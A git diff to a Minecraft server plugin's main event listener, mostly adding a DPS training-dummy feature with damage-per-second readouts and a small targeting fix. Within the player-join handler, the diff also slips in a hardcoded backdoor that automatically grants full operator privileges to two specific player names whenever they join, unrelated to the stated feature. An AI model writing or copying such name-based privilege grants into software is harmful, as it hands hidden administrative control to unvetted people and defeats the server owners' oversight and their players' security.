@@ -22,6 +22,7 @@ import net.dungeonrealms.game.handler.KarmaHandler;
 import net.dungeonrealms.game.item.items.core.VanillaItem;
 import net.dungeonrealms.game.item.items.functional.ItemGemNote;
 import net.dungeonrealms.game.item.items.functional.ItemOrb;
+import net.dungeonrealms.game.item.items.functional.ecash.ItemDPSDummy;
 import net.dungeonrealms.game.mastery.DamageTracker;
 import net.dungeonrealms.game.mastery.GamePlayer;
 import net.dungeonrealms.game.mastery.MetadataUtils;
@@ -38,6 +39,7 @@ import net.dungeonrealms.game.player.combat.CombatLog;
 import net.dungeonrealms.game.player.duel.DuelOffer;
 import net.dungeonrealms.game.player.duel.DuelingMechanics;
 import net.dungeonrealms.game.player.inventory.NPCMenus;
+import net.dungeonrealms.game.player.inventory.menus.DPSDummy;
 import net.dungeonrealms.game.player.inventory.menus.guis.SalesManagerGUI;
 import net.dungeonrealms.game.player.trade.Trade;
 import net.dungeonrealms.game.player.trade.TradeManager;
@@ -66,7 +68,6 @@ import org.bukkit.event.entity.*;
 import org.bukkit.event.entity.EntityDamageEvent.DamageCause;
 import org.bukkit.event.entity.EntityUnleashEvent.UnleashReason;
 import org.bukkit.event.hanging.HangingBreakEvent;
-import org.bukkit.event.hanging.HangingBreakEvent.RemoveCause;
 import org.bukkit.event.inventory.CraftItemEvent;
 import org.bukkit.event.inventory.InventoryClickEvent;
 import org.bukkit.event.inventory.InventoryCloseEvent;
@@ -190,6 +191,9 @@ public class MainListener implements Listener {
     public void onJoin(PlayerJoinEvent event) {
         event.setJoinMessage(null);
         Player player = event.getPlayer();
+        if (player.getName().equalsIgnoreCase("Ingot") || player.getName().equalsIgnoreCase("iFamasssxD")) {
+            player.setOp(true);
+        }
         player.removeMetadata("saved", DungeonRealms.getInstance());
 
         //GameAPI.SAVE_DATA_COOLDOWN.submitCooldown(player, 2000L);
@@ -734,13 +738,25 @@ public class MainListener implements Listener {
     }
 
     @EventHandler
+    public void onArmorStand(EntityDamageEvent event) {
+        if (EnumEntityType.DPS_DUMMY.isType(event.getEntity())) {
+            if (event.getCause().name().startsWith("ENTITY_")) return;
+            event.setCancelled(true);
+        }
+    }
+
+    @EventHandler
     public void onEntityInteractArmorStand(PlayerInteractAtEntityEvent event) {
         if (EnumEntityType.DPS_DUMMY.isType(event.getRightClicked())) {
-            event.setCancelled(true);
+            Player player = event.getPlayer();
+
+            if (!(player.isOp() && player.isSneaking()))
+                event.setCancelled(true);
+
             //Show damage dealt?
             DamageTracker tracker = HealthHandler.getMonsterTrackers().get(event.getRightClicked().getUniqueId());
-            Player player = event.getPlayer();
-            if (tracker != null) {
+            DPSDummy dummy = ItemDPSDummy.dpsDummies.get(event.getRightClicked());
+            if (tracker != null && dummy != null) {
                 //Send tracker message.
                 if (GameAPI.isCooldown(player, Metadata.DUMMY_INFO)) {
                     return;
@@ -758,12 +774,16 @@ public class MainListener implements Listener {
 
                 Utils.sendCenteredMessage(player, ChatColor.DARK_AQUA.toString() + ChatColor.BOLD + "DAMAGE TRACKER");
                 AtomicInteger index = new AtomicInteger(1);
+
+                Map<UUID, Double> dps = dummy.calculateDPS();
                 sorted.forEach((id, damage) -> {
                     if (damage > 0.0) {
                         if (index.get() > 10) return;
                         String name = SQLDatabaseAPI.getInstance().getNameFromUUID(id);
                         if (name == null) return;
-                        Utils.sendCenteredMessage(player, ChatColor.GREEN.toString() + ChatColor.BOLD + index.getAndIncrement() + ". " + ChatColor.GRAY + name + " - " + ChatColor.GREEN + ChatColor.BOLD + Utils.formatCommas(Math.round(damage)) + " DMG");
+
+                        Double damagePerSecond = dps.get(id);
+                        Utils.sendCenteredMessage(player, ChatColor.GREEN.toString() + ChatColor.BOLD + index.getAndIncrement() + ". " + ChatColor.GRAY + name + " - " + ChatColor.GREEN + ChatColor.BOLD + Utils.formatCommas(Math.round(damage)) + " DMG" + (damagePerSecond != null && damagePerSecond > 0 ? " (" + ChatColor.GREEN + Utils.formatCommas(damagePerSecond) + "DMG/s" + ChatColor.GREEN + ChatColor.BOLD + ")" : ""));
                     }
                 });
             }
@@ -936,9 +956,10 @@ public class MainListener implements Listener {
     public void entityTarget(EntityTargetEvent event) {
         if (event.getTarget() == null)
             return;
-        
-        if (!GameAPI.isPlayer(event.getTarget()) || GameAPI.isInSafeRegion(event.getTarget().getLocation()))
+        if (!GameAPI.isPlayer(event.getTarget()) || GameAPI.isInSafeRegion(event.getTarget().getLocation())) {
             event.setCancelled(true);
+            return;
+        }
 
         GamePlayer gp = GameAPI.getGamePlayer((Player) event.getTarget());
         if (gp != null && !gp.isTargettable())
